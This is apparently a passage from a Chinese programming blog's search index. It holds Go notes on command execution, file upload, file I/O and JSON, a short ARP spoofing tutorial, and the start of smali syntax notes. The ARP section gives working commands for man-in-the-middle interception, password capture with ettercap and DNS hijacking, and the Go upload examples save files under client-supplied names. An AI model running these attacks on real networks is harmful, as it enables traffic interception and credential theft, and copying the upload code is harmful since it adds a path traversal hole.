class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os/exec&quot;<br>)<br><br>func main() &#123;<br>// 执行命令并等待命令执行完成<br>err := exec.Command(&quot;ls&quot;, &quot;-l&quot;).Run()<br>if err != nil &#123;<br>fmt.Println(&quot;命令执行失败:&quot;, err)<br>return<br>&#125;<br><br>// 执行命令但不等待命令执行完成<br>cmd := exec.Command(&quot;echo&quot;, &quot;Hello, World!&quot;)<br>err = cmd.Start()<br>if err != nil &#123;<br>fmt.Println(&quot;命令执行失败:&quot;, err)<br>return<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="syscall-Exec"><a href="#syscall-Exec" class="headerlink" title="syscall.Exec"></a>syscall.Exec</h2><p>用于替换当前进程为指定命令的进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os&quot;<br>&quot;os/exec&quot;<br>&quot;syscall&quot;<br>)<br><br>func main() &#123;<br>// 替换当前进程为指定命令的进程<br>err := syscall.Exec(&quot;/bin/ls&quot;, []string&#123;&quot;ls&quot;, &quot;-l&quot;&#125;, os.Environ())<br>if err != nil &#123;<br>fmt.Println(&quot;命令执行失败:&quot;, err)<br>return<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="net-http-包"><a href="#net-http-包" class="headerlink" title="net&#x2F;http 包"></a>net&#x2F;http 包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;net/http&quot;<br>    &quot;os&quot;<br>)<br><br>func uploadFile(w http.ResponseWriter, r *http.Request) &#123;<br>    file, handler, err := r.FormFile(&quot;file&quot;)  // 通过表单获取上传文件的信息<br>    if err != nil &#123;<br>        http.Error(w, &quot;Failed to retrieve file&quot;, http.StatusBadRequest)<br>        return<br>    &#125;<br>    defer file.Close()<br><br>    // 创建并打开本地文件<br>    f, err := os.OpenFile(handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)<br>    if err != nil &#123;<br>        http.Error(w, &quot;Failed to create file&quot;, http.StatusInternalServerError)<br>        return<br>    &#125;<br>    defer f.Close()<br><br>    // 将上传文件的内容拷贝到本地文件<br>    _, err = io.Copy(f, file)<br>    if err != nil &#123;<br>        http.Error(w, &quot;Failed to copy file&quot;, http.StatusInternalServerError)<br>        return<br>    &#125;<br><br>    w.Write([]byte(&quot;文件上传成功&quot;))<br>&#125;<br><br>func main() &#123;<br>    http.HandleFunc(&quot;/upload&quot;, uploadFile)<br>    http.ListenAndServe(&quot;:8080&quot;, nil)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Gin-框架"><a href="#Gin-框架" class="headerlink" title="Gin 框架"></a>Gin 框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;github.com/gin-gonic/gin&quot;<br>    &quot;net/http&quot;<br>)<br><br>func uploadFile(c *gin.Context) &#123;<br>    file, err := c.FormFile(&quot;file&quot;)  // 通过表单获取上传文件的信息<br>    if err != nil &#123;<br>        c.String(http.StatusBadRequest, &quot;Failed to retrieve file&quot;)<br>        return<br>    &#125;<br><br>    // 将上传文件保存到本地<br>    err = c.SaveUploadedFile(file, file.Filename)<br>    if err != nil &#123;<br>        c.String(http.StatusInternalServerError, &quot;Failed to save file&quot;)<br>        return<br>    &#125;<br><br>    c.String(http.StatusOK, &quot;文件上传成功&quot;)<br>&#125;<br><br>func main() &#123;<br>    r := gin.Default()<br>    r.POST(&quot;/upload&quot;, uploadFile)<br>    r.Run(&quot;:8080&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="os-Open"><a href="#os-Open" class="headerlink" title="os.Open"></a>os.Open</h2><p>读取文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;os&quot;<br>    &quot;fmt&quot;<br>)<br><br>func main() &#123;<br>    file, err := os.Open(&quot;file.txt&quot;) // 打开文件<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error opening file:&quot;, err)<br>        return<br>    &#125;<br>    defer file.Close() // 确保文件在使用后关闭<br><br>    buffer := make([]byte, 1024) // 创建缓冲区<br>    bytesRead, err := file.Read(buffer) // 读取文件内容到缓冲区<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error reading file:&quot;, err)<br>        return<br>    &#125;<br>    fmt.Println(&quot;Bytes read:&quot;, bytesRead)<br>    fmt.Println(&quot;Content:&quot;, string(buffer[:bytesRead]))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ioutil-ReadFile"><a href="#ioutil-ReadFile" class="headerlink" title="ioutil.ReadFile"></a>ioutil.ReadFile</h2><p>读取整个文件内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;io/ioutil&quot;<br>    &quot;fmt&quot;<br>)<br><br>func main() &#123;<br>    content, err := ioutil.ReadFile(&quot;file.txt&quot;) // 读取整个文件内容<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error reading file:&quot;, err)<br>        return<br>    &#125;<br>    fmt.Println(&quot;Content:&quot;, string(content))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="bufio-Scanner"><a href="#bufio-Scanner" class="headerlink" title="bufio.Scanner"></a>bufio.Scanner</h2><p>按行读取文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;os&quot;<br>    &quot;fmt&quot;<br>    &quot;bufio&quot;<br>)<br><br>func main() &#123;<br>    file, err := os.Open(&quot;file.txt&quot;) // 打开文件<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error opening file:&quot;, err)<br>        return<br>    &#125;<br>    defer file.Close()<br><br>    scanner := bufio.NewScanner(file) // 创建 Scanner 对象<br>    for scanner.Scan() &#123; // 循环读取每一行<br>        line := scanner.Text() // 获取当前行的内容<br>        fmt.Println(&quot;Line:&quot;, line)<br>    &#125;<br><br>    if err := scanner.Err(); err != nil &#123;<br>        fmt.Println(&quot;Error reading file:&quot;, err)<br>        return<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="WriteFile"><a href="#WriteFile" class="headerlink" title="WriteFile"></a>WriteFile</h2><p>将字节切片写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;io/ioutil&quot;  // 导入 ioutil 包<br>    &quot;log&quot;        // 导入 log 包<br>)<br><br>func main() &#123;<br>    data := []byte(&quot;Hello, World!&quot;)  // 待写入的数据<br><br>    err := ioutil.WriteFile(&quot;file.txt&quot;, data, 0644)  // 将数据写入文件 &quot;file.txt&quot;<br>    if err != nil &#123;<br>        log.Fatal(err)  // 如果发生错误，输出错误信息并退出程序<br>    &#125;<br><br>    log.Println(&quot;File written successfully.&quot;)  // 文件写入成功<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="OpenFile"><a href="#OpenFile" class="headerlink" title="OpenFile"></a>OpenFile</h2><p>打开文件并写入内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;log&quot;  // 导入 log 包<br>    &quot;os&quot;   // 导入 os 包<br>)<br><br>func main() &#123;<br>    file, err := os.OpenFile(&quot;file.txt&quot;, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)  // 打开文件 &quot;file.txt&quot; 并设置写入模式<br>    if err != nil &#123;<br>        log.Fatal(err)  // 如果打开文件时发生错误，输出错误信息并退出程序<br>    &#125;<br>    defer file.Close()  // 确保文件在操作结束后关闭<br><br>    data := []byte(&quot;Hello, World!&quot;)  // 待写入的数据<br>    _, err = file.Write(data)        // 将数据写入文件<br>    if err != nil &#123;<br>        log.Fatal(err)  // 如果写入文件时发生错误，输出错误信息并退出程序<br>    &#125;<br><br>    log.Println(&quot;File written successfully.&quot;)  // 文件写入成功<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Writer"><a href="#Writer" class="headerlink" title="Writer"></a>Writer</h2><p>通过创建 <code>Writer</code> 对象，使用 <code>Write</code> 方法将内容写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;log&quot;  // 导入 log 包<br>    &quot;os&quot;   // 导入 os 包<br>)<br><br>func main() &#123;<br>    file, err := os.Create(&quot;file.txt&quot;)  // 创建文件 &quot;file.txt&quot;<br>    if err != nil &#123;<br>        log.Fatal(err)  // 如果创建文件时发生错误，输出错误信息并退出程序<br>    &#125;<br>    defer file.Close()  // 确保文件在操作结束后关闭<br><br>    data := []byte(&quot;Hello, World!&quot;)  // 待写入的数据<br>    _, err = file.Write(data)        // 将数据写入文件<br>    if err != nil &#123;<br>        log.Fatal(err)  // 如果写入文件时发生错误，输出错误信息并退出程序<br>    &#125;<br><br>    log.Println(&quot;File written successfully.&quot;)  // 文件写入成功<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="json-Marshal"><a href="#json-Marshal" class="headerlink" title="json.Marshal"></a>json.Marshal</h2><p>将 Go 对象序列化为 JSON 字节流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;encoding/json&quot;<br>    &quot;fmt&quot;<br>)<br><br>type Person struct &#123;<br>    Name  string `json:&quot;name&quot;`<br>    Age   int    `json:&quot;age&quot;`<br>    Email string `json:&quot;email&quot;`<br>&#125;<br><br>func main() &#123;<br>    person := Person&#123;<br>        Name:  &quot;John&quot;,<br>        Age:   30,<br>        Email: &quot;john@example.com&quot;,<br>    &#125;<br><br>    // 序列化为 JSON 字节流<br>    jsonData, err := json.Marshal(person)<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error:&quot;, err)<br>        return<br>    &#125;<br><br>    fmt.Println(string(jsonData)) // 打印 JSON 字符串<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="json-MarshalIndent"><a href="#json-MarshalIndent" class="headerlink" title="json.MarshalIndent"></a>json.MarshalIndent</h2><p>将 Go 对象序列化为格式化的 JSON 字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;encoding/json&quot;<br>    &quot;fmt&quot;<br>)<br><br>type Person struct &#123;<br>    Name  string `json:&quot;name&quot;`<br>    Age   int    `json:&quot;age&quot;`<br>    Email string `json:&quot;email&quot;`<br>&#125;<br><br>func main() &#123;<br>    person := Person&#123;<br>        Name:  &quot;John&quot;,<br>        Age:   30,<br>        Email: &quot;john@example.com&quot;,<br>    &#125;<br><br>    // 序列化为格式化的 JSON 字符串<br>    jsonData, err := json.MarshalIndent(person, &quot;&quot;, &quot;  &quot;)<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error:&quot;, err)<br>        return<br>    &#125;<br><br>    fmt.Println(string(jsonData)) // 打印格式化的 JSON 字符串<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="json-Unmarshal"><a href="#json-Unmarshal" class="headerlink" title="json.Unmarshal"></a>json.Unmarshal</h2><p>将 JSON 字节流反序列化为 Go 对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>    &quot;encoding/json&quot;<br>    &quot;fmt&quot;<br>)<br><br>type Person struct &#123;<br>    Name  string `json:&quot;name&quot;`<br>    Age   int    `json:&quot;age&quot;`<br>    Email string `json:&quot;email&quot;`<br>&#125;<br><br>func main() &#123;<br>    jsonData := []byte(`&#123;&quot;name&quot;:&quot;John&quot;,&quot;age&quot;:30,&quot;email&quot;:&quot;john@example.com&quot;&#125;`)<br><br>    // 反序列化为 Go 对象<br>    var person Person<br>    err := json.Unmarshal(jsonData, &amp;person)<br>    if err != nil &#123;<br>        fmt.Println(&quot;Error:&quot;, err)<br>        return<br>    &#125;<br><br>    fmt.Println(person) // 打印反序列化后的对象<br>&#125;<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP 欺骗</title>
      <link href="/2023/06/16/other/arp%E6%AC%BA%E9%AA%97/arp/"/>
      <url>/2023/06/16/other/arp%E6%AC%BA%E9%AA%97/arp/</url>
      
        <content type="html"><![CDATA[<h1 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">arpspoof -i 网卡 -t 目标地址 网关<br></code></pre></td></tr></table></figure><p><img src="arpspoof.jpg"></p><h1 id="路由转发"><a href="#路由转发" class="headerlink" title="路由转发"></a>路由转发</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p><img src="ip_forward.jpg"></p><h1 id="截获图片"><a href="#截获图片" class="headerlink" title="截获图片"></a>截获图片</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">driftnet -i 网卡 -v<br></code></pre></td></tr></table></figure><p><img src="driftnet.jpg"></p><h1 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ettercap -Tq -i eth0<br></code></pre></td></tr></table></figure><p><img src="ettercap.jpg"></p><h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vim /etc/ettercap/etter.dns<br></code></pre></td></tr></table></figure><p>在 <code>etter.dns</code> 文件中添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 所有域名都指向IP<br>*A192.168.188.252<br># 所有IP都指向域名<br>*RPT192.168.188.252<br></code></pre></td></tr></table></figure><p><img src="etter.jpg"></p><p>重启 <code>apache</code> 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">systemctl restart apache2.service<br></code></pre></td></tr></table></figure><p>启动 <code>ettercap</code> 工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ettercap -G<br></code></pre></td></tr></table></figure><p><img src="ettercap_G_1.jpg"></p><p>扫描存活主机</p><p><img src="ettercap_G_2.jpg"></p><p>查看主机列表</p><p><img src="ettercap_G_3.jpg"></p><p>网关添加到 <code> Target1</code> ，目标IP添加到 <code>Target2</code></p><p><img src="ettercap_G_4.jpg"></p><p>开启 <code>dns_spoof</code> 插件(双击)</p><p><img src="ettercap_G_5.jpg"></p><p><img src="ettercap_G_6.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP 欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smali</title>
      <link href="/2022/07/22/%E8%AF%AD%E8%A8%80/smali/smali/"/>
      <url>/2022/07/22/%E8%AF%AD%E8%A8%80/smali/smali/</url>
      
        <content type="html"><![CDATA[<p><strong>L开头全包路径结尾都必须加分号</strong></p><h1 id="java转smali"><a href="#java转smali" class="headerlink" title="java转smali"></a>java转smali</h1><p><code>idea</code> 安装 <code>java2smali</code> 插件</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>java转smali：</strong></p><p>1、使用 <code>javac</code> 将 <code>.java</code> 文件转换成 <code>.class</code> 文件</p><p>2、使用 <code>dx.jar</code> 将 <code>.class</code> 文件转换成 <code>.dex</code> 文件</p><p>3、使用 <code>baksmali</code> 将 <code>.dex</code> 文件转换成 <code>.smali</code> 文件</p><p><strong>smali转java：</strong></p><p>1、使用 <code>smali.iar</code> 将 <code>.smali</code> 文件转换成 <code>.dex</code> 文件</p><p>2、使用 <code>dex2iar</code> 将 <code>.dex</code> 转换成 <code>.class</code> 文件</p><p>3、使用 <code>jad</code> 将 <code>.class</code> 转换成 <code>.java</code> 文件</p><h1 id="定义数据类型"><a href="#定义数据类型" class="headerlink" title="定义数据类型"></a>定义数据类型</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">const-string v0, &quot;q&quot;# 定义字符串变量，并将 q 赋值给 v0<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>const-string</td><td>字符串</td></tr><tr><td>const&#x2F;4</td><td>最大只允许存放4位数值（4个二进制位）（int、char、byte、short、long、boolean）</td></tr><tr><td>const&#x2F;16</td><td>最大只允许存放16位数值（int、char、byte、short、long、boolean）</td></tr><tr><td>const&#x2F;32</td><td>最大只允许存放32位数值（int、char、byte、short、long、boolean）</td></tr><tr><td>const&#x2F;high16</td><td>最大只允许存放16位数值（float）</td></tr><tr><td>const-wide&#x2F;high16</td><td>最大只允许存放16位数值（double、long）</td></tr><tr><td>const-class</td><td>字节码对象赋值</td></tr></tbody></table><h1 id="返回值类型"><a href="#返回值类型" class="headerlink" title="返回值类型"></a>返回值类型</h1><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>V</td><td>void 空类型，仅用作返回类型</td></tr><tr><td>Z</td><td>boolean 布尔类型</td></tr><tr><td>B</td><td>byte 字节类型</td></tr><tr><td>S</td><td>short 短整型 16位</td></tr><tr><td>C</td><td>char 字符型</td></tr><tr><td>I</td><td>int 整形</td></tr><tr><td>J</td><td>long 长整型 64 位</td></tr><tr><td>F</td><td>float 浮点型</td></tr><tr><td>D</td><td>double 双精度型 64 位</td></tr><tr><td>[</td><td>数组</td></tr><tr><td>L+全类名路径用&#x2F;分割</td><td>objec</td></tr></tbody></table><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><code>android</code> 变量都是存放在寄存器中的，一个寄存器可存储 <code>32位</code> 长度的类型，其中 <code>long</code> 和 <code>double</code> 是 <code>64位</code> 的，需要使用 <code>两个寄存器</code> 保存。</p><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>v0-n</td><td>本地寄存器</td></tr><tr><td>p0-n</td><td>参数寄存器</td></tr></tbody></table><p><strong>v命名法</strong></p><p>如有两个局部变量则用 <code>v0、v1</code> 表示，此时如果还有 <code>this</code> 和其他形参，则用 <code>v2-n</code> 表示</p><p><strong>p命名法</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>p0</td><td>this</td></tr><tr><td>p1</td><td>第一个参数</td></tr><tr><td>p2</td><td>第二个参数</td></tr></tbody></table><h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="line-N"><a href="#line-N" class="headerlink" title=".line N"></a>.line N</h2><p>与 <code>java</code> 源码文件的映射关系</p><h2 id="cond-0"><a href="#cond-0" class="headerlink" title=":cond_0"></a>:cond_0</h2><p>条件分支，配合 <code>if</code> 使用</p><h2 id="prologue"><a href="#prologue" class="headerlink" title=".prologue"></a>.prologue</h2><p>程序的开始</p><h2 id="param"><a href="#param" class="headerlink" title=".param"></a>.param</h2><p>声明参数</p><h2 id="goto-0"><a href="#goto-0" class="headerlink" title=":goto_0"></a>:goto_0</h2><p>跳转分支，配合 <code>goto</code> 关键字使用</p><h2 id="registers-1"><a href="#registers-1" class="headerlink" title=".registers 1"></a>.registers 1</h2><p>局部变量+形参数量</p><p>一个寄存器可存储 <code>32位</code> 长度的类型，其中 <code>long</code> 和 <code>double</code> 是 <code>64位</code> 的，需要使用 <code>两个寄存器</code> 保存。</p><h2 id="local-1"><a href="#local-1" class="headerlink" title=".local 1"></a>.local 1</h2><p>显示局部变量数量</p><h2 id="locals-1"><a href="#locals-1" class="headerlink" title=".locals 1"></a>.locals 1</h2><p>参考 <code>registers </code></p><h1 id="字段声明"><a href="#字段声明" class="headerlink" title="字段声明"></a>字段声明</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.field [权限修饰符] [静态修饰符] [&lt;变量名&gt;:&lt;变量全类名路径&gt;];<br>.field public a:Lcom/lang/String;<br></code></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>private static String a;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest;# 声明类（必须）<br>.super Ljava/lang/Object# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br># 定义变量<br>.filed public static a:Ljava/lang/String;<br></code></pre></td></tr></table></figure><h1 id="取-赋值"><a href="#取-赋值" class="headerlink" title="取&#x2F;赋值"></a>取&#x2F;赋值</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 